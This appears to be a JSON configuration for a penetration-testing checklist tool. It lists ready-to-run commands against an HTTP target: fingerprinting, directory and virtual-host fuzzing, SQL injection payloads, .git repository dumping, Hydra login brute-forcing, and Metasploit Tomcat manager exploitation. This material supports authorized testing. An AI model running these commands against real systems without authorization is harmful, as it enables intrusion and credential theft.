{
  "service": "HTTP",
  "port": 80,
  "categories": [
    {
      "category": "1. Recon & Technology Fingerprinting",
      "tasks": [
        {
          "id": "http_fingerprint",
          "title": "cURL & WhatWeb",
          "description": "Inspect HTTP headers for server versions and use WhatWeb to fingerprint underlying CMS or frameworks.",
          "commands": [
            "curl -I -v http://{target_ip}/",
            "whatweb http://{target_ip}/"
          ]
        },
        {
          "id": "http_nmap",
          "title": "Nmap HTTP Scripts",
          "description": "Run default HTTP NSE scripts to check for obvious vulnerabilities or interesting endpoints.",
          "commands": [
            "sudo nmap --script http-* {target_ip}"
          ]
        }
      ]
    },
    {
      "category": "2. Directory & File Fuzzing",
      "tasks": [
        {
          "id": "http_feroxbuster",
          "title": "Feroxbuster (Recursive)",
          "description": "Aggressive, recursive directory discovery filtering specific status codes.",
          "commands": [
            "feroxbuster -r -s 200,204,206,301,302,401,403 --url http://{target_ip}/ --scan-dir-listings -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt",
            "feroxbuster --url http://{target_ip}/ -r -w -E /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt"
          ]
        },
        {
          "id": "http_gobuster_dir",
          "title": "Gobuster (Extensions)",
          "description": "Targeted directory brute-forcing looking for specific file extensions.",
          "commands": [
            "gobuster dir -u http://{target_ip}/ -w /usr/share/wordlists/dirb/common.txt -t 5 -x .php,.html,.txt"
          ]
        }
      ]
    },
    {
      "category": "3. VHost & Visual Recon",
      "tasks": [
        {
          "id": "http_ffuf_vhost",
          "title": "Ffuf (VHost Fuzzing)",
          "description": "Fuzz the Host header to find hidden virtual hosts. Replace the -fs flag value with the default response size.",
          "commands": [
            "ffuf -u http://{target_ip} -H \"Host: FUZZ.target.local\" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 1131"
          ]
        },
        {
          "id": "http_eyewitness",
          "title": "EyeWitness (Visual Recon)",
          "description": "Take screenshots of discovered web pages, identify default credentials, and categorize them into an HTML report.",
          "commands": [
            "eyewitness -f urllist.txt -d /tmp/eyewitness_results --web"
          ]
        },
        {
          "id": "http_gowitness",
          "title": "Gowitness (Visual Recon)",
          "description": "Take full-page screenshots of a large list of discovered URLs and view them in a local web interface.",
          "commands": [
            "gowitness scan file -f urllist.txt --screenshot-fullpage --timeout 15 --write-db",
            "gowitness report server"
          ]
        }
      ]
    },
    {
      "category": "4. Web Application Attacks",
      "tasks": [
        {
          "id": "http_sqli_basic",
          "title": "Basic SQLi Probing",
          "description": "Test input fields and URL parameters for simple SQL injection vulnerabilities.",
          "commands": [
            "admin' OR 1=1 -- //",
            "test' OR 'a'='a"
          ]
        },
        {
          "id": "http_git_dumper",
          "title": "Exposed .git Extraction",
          "description": "If /.git is accessible, dump the repository locally and scan it for hardcoded secrets.",
          "commands": [
            "git-dumper http://{target_ip}/.git ./git-repo",
            "cd git-repo && git log -S'http'",
            "cd git-repo && gitleaks detect"
          ]
        },
        {
          "id": "http_hydra_form",
          "title": "Hydra Form Brute-Forcing",
          "description": "Brute-force an HTTP POST login form. Adjust the URI path, variables, and failure string.",
          "commands": [
            "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt {target_ip} http-post-form \"/login.php:username=^USER^&password=^PASS^:Data error\""
          ]
        },
        {
          "id": "http_tomcat_jboss",
          "title": "Tomcat / JBoss Enumeration",
          "description": "Scan and exploit default credentials on Tomcat or JBoss managers.",
          "commands": [
            "msfconsole -x \"use auxiliary/scanner/http/tomcat_enum; set RHOSTS {target_ip}; run\"",
            "msfconsole -x \"use exploit/multi/http/tomcat_mgr_deploy; set RHOSTS {target_ip}; run\""
          ]
        }
      ]
    }
  ]
}